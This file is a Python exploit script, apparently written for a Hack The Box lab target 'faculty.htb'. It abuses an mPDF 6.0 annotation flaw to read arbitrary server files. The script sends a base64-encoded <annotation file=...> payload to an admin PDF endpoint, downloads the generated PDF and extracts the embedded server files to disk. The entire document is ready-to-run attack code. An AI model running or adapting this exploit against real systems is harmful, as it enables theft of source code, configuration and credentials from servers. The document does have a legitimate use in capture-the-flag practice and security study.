#!/usr/bin/env python3

"""
Author: poorduck
Description: This script uses the mPDF 6.0 <annotation> issue https://github.com/mpdf/mpdf/issues/356
             to extract server files/source code by including them into pdf file and after downloads the generated file,
             it extracts all attachments from that pdf and saves them to disk.

Usage: python script_name.py file_path
            where file_path is the path to the file to be attached to the PDF.
"""

import requests as r
from sys import argv
import base64
import PyPDF2
import os

s = r.session()
# s.proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
# s.verify = False
host = "http://faculty.htb"
file_path = argv[1]
payload = f'<annotation file="{file_path}" content="{file_path}" icon="Graph" title="Attached File: {file_path}" pos-x="195" />'
encode_payload = base64.b64encode(payload.encode('UTF-8')).decode('UTF-8')

# Generate pdf with our payload and get filename
filename = s.post(f"{host}/admin/download.php", data={"pdf": encode_payload})
if 'mPDF Error' in filename.text:
    exit(filename.text)
print("[+] Uploaded filename:", filename.text.strip())
print(f"[+] URL: {host}/mpdf/tmp/{filename.text.strip()}")

# Download generated file
get_file = s.get(f"{host}/mpdf/tmp/{filename.text.strip()}")
with open(filename.text.strip(), 'wb') as f:
    f.write(get_file.content)


# extract all annotations from pdf file.
def getAttachments(reader):
    """
    https://stackoverflow.com/questions/68083358/get-pdf-attachments-using-python
    """
    attachments = {}
    #go through all pages and all annotations to those pages,
    #to find any attached files
    for pagenum in range(0, reader.getNumPages()):
        page_object = reader.getPage(pagenum)
        if "/Annots" in page_object:
            for annot in page_object['/Annots']:
                annotobj = annot.getObject()
                if annotobj['/Subtype'] == '/FileAttachment':
                    fileobj = annotobj["/FS"]
                    attachments[fileobj["/F"]] = fileobj["/EF"]["/F"].get_data()
    return attachments


handler = open(filename.text.strip(), 'rb')
reader = PyPDF2.PdfFileReader(handler)
dictionary = getAttachments(reader)
for fName, fData in dictionary.items():
    with open(fName, 'wb') as outfile:
        outfile.write(fData)


# Clean CWD
os.remove(filename.text.strip()) 